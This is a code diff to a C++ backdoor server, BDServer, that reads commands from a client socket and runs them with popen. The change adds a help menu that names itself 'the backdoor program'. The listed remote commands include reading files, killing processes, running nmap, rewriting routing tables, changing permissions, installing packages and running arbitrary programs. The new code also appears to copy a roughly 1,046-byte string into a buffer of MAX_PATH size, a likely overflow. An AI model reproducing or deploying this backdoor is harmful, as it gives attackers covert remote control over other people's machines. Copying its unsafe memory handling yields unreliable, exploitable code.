@@ -81,16 +81,19 @@ void BDServer :: waitForCommand()
 {
   int amountRead;
   char buffer[MAX_PATH];
-  
+
   printf("Waiting for command...\n");
+  memcpy(buffer, "-----------------------------------------------\n\0", 50);
+  write(_ClientSocket, buffer, 50);
+  memset(buffer, 0, MAX_PATH);
   amountRead = read(_ClientSocket, buffer, MAX_PATH);
   while(amountRead > 0){
     trimLeft(buffer, strlen(buffer));
     trimRight(buffer, strlen(buffer));
     if (amountRead == 0){
       try{
-	memcpy(buffer, "Empty command\n", 14);
-	write(_ClientSocket, buffer, 14);
+	        memcpy(buffer, "Empty command\n", 14);
+	        write(_ClientSocket, buffer, 14);
       }catch(const std::exception& e){
 	//client has disconnected
 	break;
@@ -122,11 +125,11 @@ void BDServer :: waitForCommand()
 */
 
 void BDServer :: parseCommand(char* command){
-  /* todo 
+  /* todo
      pwd
      cd <dir>
      - should be handled with system calls instead of popen
-     
+
      ls
      cat <file>
      help
@@ -141,14 +144,14 @@ void BDServer :: parseCommand(char* command){
   */
   char* function;
   char* arguments;
-  
+
   trimLeft(command, strlen(command));
   trimRight(command, strlen(command));
 
   //extract function - first characters up to space or tab
   function = strtok(command, " \t");
   arguments = strtok(NULL, " \t");
-  
+
   //if next strtok read on NULL is NULL then there are no arguments (nothing following function)
   if(arguments == NULL){
     if(strcmp(function, "cd") == 0){
@@ -171,7 +174,7 @@ void BDServer :: parseCommand(char* command){
 
 /*
   executeCommand
-    
+
   executeCommand takes in a command and executes it and redirects the output
   of the response so that the output can be sent to the client socket.
 
@@ -182,7 +185,7 @@ void BDServer :: executeCommand(char* command)
   char path[MAX_PATH];
   char *output = (char*)malloc(MAX_PATH * sizeof(char));
   char *placeholder = output;
-  
+
   printf("%s\n", command);
 
   fp = popen(command, "r");
@@ -213,7 +216,31 @@ void BDServer :: executeCommand(char* command)
 }
 
 void BDServer :: helpMenu(){
-  printf("Help!\n");
+  printf("Printing command list and descriptions...\n");
+  char buffer[MAX_PATH];
+  memcpy(buffer, "Command listings:\n"
+  "-----------------------------------------------\n"
+  "pwd							- print working directory\n"
+  "cd <dir>						- change directory to <dir>\n"
+  "ls							- list the contents of the current working directory\n"
+  "ll 							- (ls -FGlAihp) more detailed ls\n"
+  "cat <file>						- return contents of <file>\n"
+  "who							- list currently logged in users\n"
+  "net							- show current network configuration\n"
+  "ps							- show currently running processes\n"
+  "kill -9 <pid> 						- kill process <pid>\n"
+  "nmap <params>						- run nmap with <params>\n"
+  "netstat -r 						- Display routing table\n"
+  "route flush 						- flush routing tables\n"
+  "route add -net <ipaddr> gw <gateway> 			- Add a route to the table through <ipaddr>, <gateway>\n"
+  "ext <program> <params>					- run <program> with <parameters>\n"
+  "chmod <permissions> <file>				- change <file> accessibility to <permissions>\n"
+  "apt-get install <pkg> 					- Install <pkg>\n\n"
+  "help							- print this list of commands\n"
+  "off							- terminate the backdoor program\n"
+  "-----------------------------------------------\n\n\0", 1046);
+  write(_ClientSocket, buffer, strlen(buffer)-1);
+  memset(buffer, 0, MAX_PATH);
 }
 
 void BDServer :: changeDirectory(char *directory){
@@ -256,10 +283,10 @@ void BDServer :: trimLeft(char *input, int length){
 
 void BDServer :: trimRight(char *input, int length){
   int index = length - 1;
-  
+
   while(index > 0 && (input[index] == ' ' || input[index] == '\n' || input[index] == '\t')){
     input[index] = '\0';
-    index --; 
+    index --;
   }
 }
 
